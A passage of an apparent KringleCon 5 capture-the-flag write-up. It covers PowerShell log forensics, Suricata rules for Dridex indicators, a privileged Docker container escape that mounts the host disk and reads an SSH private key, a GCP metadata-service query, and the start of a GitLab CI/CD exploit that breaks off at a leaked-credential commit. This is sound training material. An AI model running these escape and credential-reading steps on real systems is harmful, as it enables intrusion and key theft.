    <img data-src="/images/kringlecon5/objectives/obj01_05.webp" alt="jq -s &#39;.[0]&#39; powershell.json" data-caption="jq -s &#39;.[0]&#39; powershell.json" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      jq -s &#39;.[0]&#39; powershell.json
      
        
        
      
    </figcaption>
  
</figure>
<p>The <code>SystemTime</code> value could be a good indicator of when the attack took place. The attack could have been noisy and generated lots of logs. The following command retrieves all <code>SystemTime</code> values that are not null, extracts only the year-month-day value and count them:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj01_06.webp" alt="jq -s &#39;.. |.SystemTime? | select(. != null) | split(&#34;T&#34;)[0]&#39; powershell.json | sort | uniq -c" data-caption="jq -s &#39;.. |.SystemTime? | select(. != null) | split(&#34;T&#34;)[0]&#39; powershell.json | sort | uniq -c" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      jq -s &#39;.. |.SystemTime? | select(. != null) | split(&#34;T&#34;)[0]&#39; powershell.json | sort | uniq -c
      
        
        
      
    </figcaption>
  
</figure>
<p>The day with the most hits is on Christmas Eve.</p>
<p>Answer: <code>12/24/2022</code></p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q2. An attacker got a secret from a file. What was the original files&rsquo;s name?</div>
<p>We can list all the commands that were logged with:<br />
<div class="box">$ jq -s &lsquo;.. | .ScriptBlockText? | select(. != null) | select(. != &ldquo;prompt&rdquo;)&rsquo; powershell.json</div></p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj01_07.webp" alt="Powershell commands" data-caption="Powershell commands" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Powershell commands
      
        
        
      
    </figcaption>
  
</figure>
<p>We can see that the attacker reads first the content of the <code>Recipe</code> file and then tries to replace some content with another before storing the result in a new file <code>recipe_updated.txt</code>.</p>
<p>Answer: <code>Recipe</code></p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q3. The content of the previous file were retrieved, changed, and stored to a variable by the attacker. This was done multiple times. Submit the last full Powershell line that performed only these actions.</div>
<p>As we saw in the previous question, the variable where the content of the file is retrieved is <code>$foo</code>. Let&rsquo;s select those lines only with:<br />
<div class="box">$ jq -s &lsquo;.. | .ScriptBlockText? | select(. != null) | select(contains(&quot;$foo&quot;))&rsquo; powershell.json</div></p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj01_08.webp" alt="$foo variable" data-caption="$foo variable" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      $foo variable
      
        
        
      
    </figcaption>
  
</figure>
<p>Answer: <code>$foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'}</code></p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q4. After storing the altered file contents into the variable, the attacker used the variable to run a separate command that wrote the modified data to a file. This was done multiple times. Submit the last full Powershell line that performed only that action.</div>
<p>If we retake the previous screenshot, we see that the content of <code>$foo</code> is then written into 2 new files, <code>recipe_updated.txt</code> and <code>Recipe.txt</code> and finally appended to the original file <code>Recipe</code> as well.</p>
<p>Answer: <code>$foo | Add-Content -Path 'Recipe'</code></p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q5. The attacker ran the previous command against a file multiple times. What is the name of this file?</div>
<p>Still on the last screenshot, we can see it was done 3 times on <code>Recipe.txt</code>.</p>
<p>Answer: <code>Recipe.txt</code></p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q6. Were any files deleted? (Yes/No)</div>
<p>We can look for the <code>Remove-Item</code> command in the <code>Payload</code> field with:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj01_09.webp" alt="jq -s &#39;.. | .Payload? | select(. != null) | select(contains(&#34;Remove-Item&#34;))&#39; powershell.json" data-caption="jq -s &#39;.. | .Payload? | select(. != null) | select(contains(&#34;Remove-Item&#34;))&#39; powershell.json" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      jq -s &#39;.. | .Payload? | select(. != null) | select(contains(&#34;Remove-Item&#34;))&#39; powershell.json
      
        
        
      
    </figcaption>
  
</figure>
<p>or the <code>del</code> command in the <code>ScriptBlockText</code> field:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj01_10.webp" alt="jq -s &#39;.. | .ScriptBlockText? | select(. != null) | select(contains(&#34;del &#34;))&#39; powershell.json" data-caption="jq -s &#39;.. | .ScriptBlockText? | select(. != null) | select(contains(&#34;del &#34;))&#39; powershell.json" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      jq -s &#39;.. | .ScriptBlockText? | select(. != null) | select(contains(&#34;del &#34;))&#39; powershell.json
      
        
        
      
    </figcaption>
  
</figure>
<p>Answer: <code>Yes</code></p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q7. Was the original file (from question 2) deleted? (Yes/No)</div>
<p>The original file was <code>Recipe</code> and was not deleted as we can see in the 2 previous screenshots.</p>
<p>Answer: <code>No</code></p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q8. What id the Event ID of the log that shows the actual command line used to delete the file?</div>
<p>The actual command that was ran to delete the files is <code>del</code>. We can <code>grep</code> the logs to retrieve the Event ID as follows:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj01_11.webp" alt="grep -i &#34;del &#34; -A 10 powershell.json" data-caption="grep -i &#34;del &#34; -A 10 powershell.json" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      grep -i &#34;del &#34; -A 10 powershell.json
      
        
        
      
    </figcaption>
  
</figure>
<p>Answer: <code>4104</code></p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q9. Is the secret ingredient compromised (Yes/No)</div>
<p>In question 2, we saw that the attacker initially did a <code>cat ./Recipe</code>. Therefore he saw the secret ingredient.</p>
<p>Answer: <code>Yes</code></p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q10. What is the secret ingredient?</div>
<p>From the result of the <code>cat ./Recipe</code> we can retrieve the initial recipe. We have to look for the <code>Out-Default</code> <em>Powershell</em> command that is executed after each command that outputs a result.</p>
<p>We can narrow down the results as we know the recipe is about <code>Lembanh</code> with:<br />
<div class="box">$ jq -s &lsquo;.. | .Payload? | select(. != null) | select(contains(&ldquo;Out-Default&rdquo;)) | select(contains(&ldquo;Lembanh&rdquo;))&rsquo; powershell.json | head -1</div></p>
<p>We can then reconstruct the orginal recipe:</p>
<div class="box"><p>Recipe from Mixolydian, the Queen of Dorian<br />
Lembanh Original Recipe</p>
<p>2 1/2 all purpose flour<br />
1 Tbsp baking powder<br />
1/4 tsp salt<br />
1/2 c  butter<br />
1/3 c brown sugar<br />
1 tsp cinnamon<br />
1/2 tsp honey (secret ingredient)<br />
2/3 c heavy whipping cream<br />
1/2 tsp vanilla extract<br />
Preheat oven to 425F. Mix the flour, baking powder and salt into a large bowl. Add the butter and mix with a well till fine granules (easiest way is with an electric mixer). Then add the sugar and cinnamon, and mix them thoroughly.<br />
Finally add the cream, honey, and vanilla and stir them in with a fork until a nice, thick dough forms.<br />
Roll the dough out about 1/2 in thickness. Cut out 3-inch squares and transfer the dough to a cookie sheet. Criss-cross each square from corner-to-corner with a knife, lightly (not cutting through the dough).<br />
Bake for about 12 minutes or more (depending on the thickness of the bread) until it is set and lightly golden.<br />
Let cool completely before eating, this bread tastes better room temperature and dry. Also for more flavor you can add more cinnamon or other spices</p>
</div>
<p>The attacker tried to replace the secret <code>honey</code> ingredient with <code>fish oil</code> as part of his attack.</p>
<p>Answer: <code>honey</code></p>
<h4 id="13-suricata-regatta">1.3 Suricata Regatta</h4>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>3/5</td>
<td>Help detect this kind of malicious activity in the future by writing some Suricata rules. Work with <strong>Dusty Giftwrap</strong> in the Tolkien Ring to get some hints.</td>
<td>Tolkien Ring</td>
</tr>
</tbody>
</table>
<p>In this terminal challenge, we are tasked to create multiple <em>Suricata</em> rules to block the <em>C2</em> traffic we analyzed in the first challenge. The rules must be create in the <code>/home/elf/suricata.rules</code> and can be tested by running <code>/home/elf/rule_checker</code>.</p>
<p>The <em>Suricata</em> documentation can help here: <a href="https://suricata.readthedocs.io/en/suricata-6.0.0/rules/intro.html">https://suricata.readthedocs.io/en/suricata-6.0.0/rules/intro.html</a>. We can as well take example of the other rules already configured in <code>/home/elf/suricata.rules</code>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Rule 1. Create a <em>Suricata</em> rule to catch DNS lookups for adv.epostoday.uk. Whenever there&rsquo;s a match, the alert message (msg) should read &ldquo;Known bad DNS lookup, possible Dridex infection&rdquo;.</div>
<p>We need a filter on the <code>dns</code> protocol for <code>dns_query</code> that look for the malicious website. This translates into:</p>
<div class="box">alert dns any any -&gt; any any (msg:&ldquo;Known bad DNS lookup, possible Dridex infection&rdquo;; dns_query; content:&ldquo;adv.epostoday.uk&rdquo;;  sid:1337; rev:1;)</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Rule 2. Develop a Suricata rule that alerts whenever the infected IP address 192.185.57.242 communicates with internal systems over HTTP.<br />
When there&rsquo;s a match, the message (msg) should read &ldquo;Investigate suspicious connections, possible Dridex infection&rdquo;.</div>
<p>Here the rule must be bidirectional. We can use the non-directional marker <code>&lt;&gt;</code>.</p>
<div class="box">alert http 192.185.57.242 any &lt;&gt; $HOME_NET any (msg:&ldquo;Investigate suspicious connections, possible Dridex infection&rdquo;; sid:1338; rev:1;)</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Rule 3. Develop a Suricata rule to match and alert on an SSL certificate for &ldquo;heardbellith.Icanwepeh.nagoya&rdquo;.<br />
When your rule matches, the message (msg) should read &ldquo;Investigate bad certificates, possible Dridex infection&rdquo;</div>
<p>This one is a little more tricky. We can check for the certificate issuer.</p>
<div class="box">alert tls any any -&gt; any any (msg:&ldquo;Investigate bad certificates, possible Dridex infection&rdquo;; tls.cert_issuer; content:&ldquo;heardbellith.Icanwepeh.nagoya&rdquo;; nocase; isdataat:!1,relative; sid:1340;)</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Rule 4. Let&rsquo;s watch for one line from the JavaScript: let byteCharacters = atob<br />
Oh, and that string might be GZip compressed - I hope that&rsquo;s OK!<br />
Just in case they try this again, please alert on that HTTP data with message &ldquo;Suspicious JavaScript function, possible Dridex infection&rdquo;</div>
<p>Nothing fancy here. the <code>file_data</code> keyword can inspect base64 encoded strings by default.</p>
<div class="box">alert http any any -&gt; any any (msg:&ldquo;Suspicious JavaScript function, possible Dridex infection&rdquo;; file_data; content:&ldquo;let byteCharacters = atob&rdquo;;)</div>
<h3 id="2---recover-the-elfen-ring">2 - Recover the Elfen Ring</h3>
<hr />
<h4 id="21-clone-with-a-difference">2.1 Clone with a Difference</h4>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>1/5</td>
<td>Clone a code repository. Get hints for this challenge from Bow Ninecandle in the Elfen Ring.</td>
<td>Elfen Ring</td>
</tr>
</tbody>
</table>
<p>The goal here is to clone a <em>Git</em> repository and get the last word of <code>README.md</code> file. We are initially asked to do it with the following command:</p>
<div class="box">$ git clone <a href="mailto:git@haugfactory.com">git@haugfactory.com</a>:asnowball/aws_scripts.git</div>
<p>This fails with the following error:</p>
<div class="box"><p><a href="mailto:git@haugfactory.com">git@haugfactory.com</a>: Permission denied (publickey).<br />
fatal: Could not read from remote repository.</p>
<p>Please make sure you have the correct access rights and the repository exists.</p>
</div>
<p>We tried to clone the repository through <em>SSH</em> and our public <em>SSH</em> key is probably not allowed in the repository. Another way to clone repositories is through HTTP/S. We can simply do:</p>
<div class="box">$ git clone <a href="http://haugfactory.com/orcadmin/aws_scripts.git">http://haugfactory.com/orcadmin/aws_scripts.git</a><br />
$ cd aws_scripts<br />
$ tail README.md</div>
<p>Answer: <code>maintainers</code></p>
<h4 id="22-prison-escape">2.2 Prison Escape</h4>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>3/5</td>
<td>Escape from a container. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. What hex string appears in the host file <code>/home/jailer/.ssh/jail.key.priv</code>?</td>
<td>Elf House</td>
</tr>
</tbody>
</table>
<p>For this challenge, the goal is to escape from a jailed process and access the host system to read the file <code>/home/jailer/.ssh/jail.key.priv</code>.</p>
<p>Let&rsquo;s start with some discovery. First of all we need to determine in what kind of &ldquo;jail&rdquo; we are in. The <code>mount</code>command shows that we are in a <em>Docker</em> container. We can see that in the different overlay paths containing the word <code>docker</code>:</p>
<div class="box">$ mount<br />
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/UP3VWCCMOBLFUPP53LKFFELBQT:/var/lib/docker/overlay2/l/NYZRV6EE566LD3JY5Q7TIGWA42:/var/lib/docker/overlay2/l/247PETFPQ5W6UFKOLGLHQKDZPJ:/var/lib/docker/overlay2/l/JB62BUPPTFNFFOYJEUX26WS7VB:/var/lib/docker/overlay2/l/PWCREWRWPOFAZ475PVNTWKI3BA:/var/lib/docker/overlay2/l/QWVRNL7TBRSVRQNV6PU4GO4JXT:/var/lib/docker/overlay2/l/TWFXPHIQZBGAT4C6T6HJIIKJ44:/var/lib/docker/overlay2/l/G5OWW3UAAB5JJFUI4JGTWSHKAZ:/var/lib/docker/overlay2/l/I32VFD5VVO2ECSFVS2GNQKA3Q4:/var/lib/docker/overlay2/l/PKZQSCTMKHO2R432Q2EID56KNP,upperdir=/var/lib/docker/overlay2/f50549b9e9e3d5a4f3e0b238c187c967022ff7cc3bd746b2163ca333d76263c0/diff,workdir=/var/lib/docker/overlay2/f50549b9e9e3d5a4f3e0b238c187c967022ff7cc3bd746b2163ca333d76263c0/work)<br />
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)<br />
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)<br />
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)<br />
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)<br />
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)<br />
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)<br />
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)<br />
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)<br />
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)<br />
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)<br />
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)<br />
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)<br />
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)<br />
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)<br />
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)<br />
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)<br />
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)<br />
/dev/root on /config type ext4 (rw,relatime)<br />
/dev/root on /etc/resolv.conf type ext4 (rw,relatime)<br />
/dev/root on /etc/hostname type ext4 (rw,relatime)<br />
/dev/root on /etc/hosts type ext4 (rw,relatime)<br />
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)</div>
<p>The same can be achieved with:</p>
<div class="box">$ cat /proc/1/cgroup<br />
11:cpuset:/docker/22a5a4b88bfffafd23de0fd693d20c38a89020ce0af97aefe29a4dcdb9f5759d<br />
10:devices:/docker/22a5a4b88bfffafd23de0fd693d20c38a89020ce0af97aefe29a4dcdb9f5759d<br />
9:blkio:/docker/22a5a4b88bfffafd23de0fd693d20c38a89020ce0af97aefe29a4dcdb9f5759d<br />
8:hugetlb:/docker/22a5a4b88bfffafd23de0fd693d20c38a89020ce0af97aefe29a4dcdb9f5759d<br />
7:memory:/docker/22a5a4b88bfffafd23de0fd693d20c38a89020ce0af97aefe29a4dcdb9f5759d<br />
6:cpu,cpuacct:/docker/22a5a4b88bfffafd23de0fd693d20c38a89020ce0af97aefe29a4dcdb9f5759d<br />
5:net_cls,net_prio:/docker/22a5a4b88bfffafd23de0fd693d20c38a89020ce0af97aefe29a4dcdb9f5759d<br />
4:perf_event:/docker/22a5a4b88bfffafd23de0fd693d20c38a89020ce0af97aefe29a4dcdb9f5759d<br />
3:freezer:/docker/22a5a4b88bfffafd23de0fd693d20c38a89020ce0af97aefe29a4dcdb9f5759d<br />
2:pids:/docker/22a5a4b88bfffafd23de0fd693d20c38a89020ce0af97aefe29a4dcdb9f5759d<br />
1:name=systemd:/docker/22a5a4b88bfffafd23de0fd693d20c38a89020ce0af97aefe29a4dcdb9f5759d<br />
0::/docker/22a5a4b88bfffafd23de0fd693d20c38a89020ce0af97aefe29a4dcdb9f5759d</div>
<p>Next step is to define what are our privileges in the container. We run as user <code>samways</code> but we have high sudoer privileges:</p>
<div class="box">$ id<br />
uid=1000(samways) gid=1000(users) groups=1000(users)<br />
$ sudo -l<br />
User samways may run the following commands on grinchum-land:<br />
(ALL) NOPASSWD: ALL<br />
$ sudo su</div>
<p>A good indicator of a privileged container is to list <code>/dev</code> and check if we see the host&rsquo;s device files (disk, ttys, loops, etc.). And this is the case here. We can as well list the host disks with:</p>
<div class="box">$ sudo fdisk -l<br />
Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors<br />
2048 cylinders, 64 heads, 32 sectors/track<br />
Units: sectors of 1 * 512 = 512 bytes</div>
<p>We can confirm the high privileges as well by checking the capabilities the container has with:</p>
<div class="box">$ grep Cap /proc/1/status<br />
CapInh: 0000000000000000<br />
CapPrm: 0000003fffffffff<br />
CapEff: 0000003fffffffff<br />
CapBnd: 0000003fffffffff<br />
CapAmb: 0000000000000000</div>
<p><code>0x3fffffffff</code> means ALL the capabilities which translates into a privileged container.</p>
<p>For more information about <em>Linux</em> capabilities, you can read <a href="https://tbhaxor.com/understanding-linux-capabilities/">https://tbhaxor.com/understanding-linux-capabilities/</a> and <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities</a>.</p>
<p>With access to the host <code>/dev</code>, we can mount the host disk in the container and interact with it:</p>
<div class="box">$ sudo su<br />
# mkdir /tmp/host<br />
# mount /dev/vda /tmp/host/<br />
# cd /tmp/host<br />
# ls -la home<br />
total 12<br />
drwxr-xr-x  3 root root 4096 Dec  1 19:12 .<br />
drwxr-xr-x 18 root root 4096 Sep 28 22:40 ..<br />
drwxr-xr-x  3 root root 4096 Dec  1 19:12 jailer</div>
<p>And we can read the private key of the user <code>jailer</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj02_01.webp" alt="/home/jailer/.ssh/jail.key.priv" data-caption="/home/jailer/.ssh/jail.key.priv" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      /home/jailer/.ssh/jail.key.priv
      
        
        
      
    </figcaption>
  
</figure>
<p>Answer: <code>082bb339ec19de4935867</code></p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p>Fun fact, the <em>GCP</em> metadata service is reachable from the container. We can retrieve all the metadata of the host system with:</p>
<div class="box">$ curl -H &ldquo;Metadata-Flavor:Google&rdquo; <a href="http://metadata.google.internal/computeMetadata/v1/?recursive=true">http://metadata.google.internal/computeMetadata/v1/?recursive=true</a></div>
<p>Unfortunately, the host does not have any service-account set :)</p>
</div>
<h4 id="23-jolly-cicd">2.3 Jolly CI/CD</h4>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>5/5</td>
<td>Exploit a CI/CD pipeline. Get hints for this challenge from Tinsel Upatree in the Elfen Ring.</td>
<td>Elf House</td>
</tr>
</tbody>
</table>
<p>This challenge is about expoiting a <em>Gitlab CI/CD</em> pipeline. We are given an internal <em>Gitlab</em> project: <a href="http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git">http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git</a> and we know as well that each commit will automatically trigger a <em>GitLab</em> runner that will automatically deploy the changes to production.</p>
<p>Let&rsquo;s start by cloning the given project:</p>
<div class="box">$ git clone <a href="http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git">http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git</a><br />
$ cd wordpress.flag.net.internal/</div>
<p>The pipeline configuration is found in the file <code>.gitlab-ci.yml</code>:</p>
<div class="box"><p>$ cat .gitlab-ci.yml<br />
stages:<br />
  - deploy</p>
<p>deploy-job:<br />
  stage: deploy<br />
  environment: production<br />
  script:<br />
    - rsync -e &ldquo;ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy&rdquo; --chown=www-data:www-data -atv --delete --progress ./ <a href="mailto:root@wordpress.flag.net.internal">root@wordpress.flag.net.internal</a>:/var/www/html</p>
</div>
<p>We see that the <code>root</code> <em>SSH</em> private key path is leaked and can be found in <code>/etc/gitlab-runner/hhc22-wordpress-deploy</code>. It is used to sync the modified files in the production webserver.</p>
<p>If we try to commit something, we get the following error:</p>
<div class="box"><p>Author identity unknown</p>
<p>*** Please tell me who you are.</p>
<p>Run</p>
<p>  git config --global user.email &ldquo;<a href="mailto:you@example.com">you@example.com</a>&rdquo;<br />
  git config --global user.name &ldquo;Your Name&rdquo;</p>
<p>to set your account&rsquo;s default identity.<br />
Omit --global to set the identity only in this repository.</p>
<p>fatal: empty ident name (for <a href="mailto:samways@grinchum-land.flag.net.internal">samways@grinchum-land.flag.net.internal</a>) not allowed</p>
</div>
<p>So we configure our <em>Git</em> user:</p>
<div class="box">$ git config --global user.email <a href="mailto:samways@grinchum-land.flag.net.internal">samways@grinchum-land.flag.net.internal</a><br />
$ git config --global user.name &ldquo;samways&rdquo;</div>
<p>We can now commit but when we push the change we need to provide a username/password that we do not have. When looking at the commit history, we can see a weird <code>whoops</code> comment in a commit:</p>
<div class="box"><p>$ git log<br />
Author: knee-oh <a href="mailto:sporx@kringlecon.com">sporx@kringlecon.com</a><br />
Date:   Wed Oct 26 13:58:15 2022 -0700</p>
<p>    updated wp-config<br />
[…]<br />
commit e19f653bde9ea3de6af21a587e41e7a909db1ca5<br />
Author: knee-oh <a href="mailto:sporx@kringlecon.com">sporx@kringlecon.com</a><br />
Date:   Tue Oct 25 13:42:54 2022 -0700</p>
<p>    whoops<br />
[…]</p>
</div>
<p>We print the commit changes to see if anything went wrong:</p>
<div class="box"><p>$ git show e19f653bde9ea3de6af21a587e41e7a909db1ca5</p>
<p>commit e19f653bde9ea3de6af21a587e41e7a909db1ca5<br />
